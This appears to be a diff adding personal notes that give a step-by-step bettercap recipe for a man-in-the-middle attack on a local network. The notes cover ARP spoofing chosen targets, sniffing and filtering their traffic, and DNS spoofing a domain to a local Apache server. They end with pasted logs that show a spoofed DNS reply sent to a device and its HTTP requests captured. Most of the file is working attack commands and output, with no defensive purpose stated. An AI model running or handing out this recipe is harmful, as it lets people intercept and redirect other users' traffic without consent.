@@ -1,0 +1,41 @@
+sudo bettercap
+net.probe on
+net.show
+set arp.spoof.targets <ip addr/addr list>
+*optional(better with it): set arp.spoof.fullduplex true
+arp.spoof on
+
+*optionl(check for device's traffic)*: net.sniff on
+*optionl(filter traffic:this example - to leave only capture from specific ip and only with more than 50bytes(so it wouldnt show all background traffic("noise"))*:
+set net.sniff.filter ip host 192.168.1.65 and greater 50
+
+*optionl(turn off sniffer)*: net.sniff off
+
+*V--USUDALLY DOES NOT WORK FROM HERE(DOES NOT REDIRECT OR FAIL TO LOAD - probably becauseof cache/history - bcuz it worked smoother with unknown sites that I hadnt ever been to(or bcuz of http))--V*
+
+*optional(overall better + if want to redirect not to this device's local ip)*:
+set dns.spoof.address <ip address of the website/device>
+
+set dns.spoof.domains <domain.com>
+*turn on apache*: sudo systemctl start apache2
+dns.spoof on
+
+
+
+*turn on apache:
+sudo systemctl start apache2
+*apache status
+sudo systemctl status apache2
+
+
+
+
+
+
+
+192.168.1.0/24 > 192.168.1.69  » [14:25:09] [sys.log] [inf] dns.spoof sending spoofed DNS reply for aleksotas.lt (->192.168.1.69) to 192.168.1.66 : 86:62:d4:77:5d:5f.
+[14:25:10] [net.sniff.http.request] http 78.57.125.39 GET aleksotas.lt/img/slideshow/3.png
+192.168.1.0/24 > 192.168.1.69  » [14:25:10] [net.sniff.http.request] http 78.57.125.39 GET aleksotas.lt/img/slideshow/3.png
+192.168.1.0/24 > 192.168.1.69  » [14:25:10] [net.sniff.http.request] http 192.168.1.66 GET aleksotas.lt/img/slideshow/4.png
+192.168.1.0/24 > 192.168.1.69  » [14:25:10] [net.sniff.http.request] http 192.168.1.66 GET aleksotas.lt/img/slideshow/4.png
+
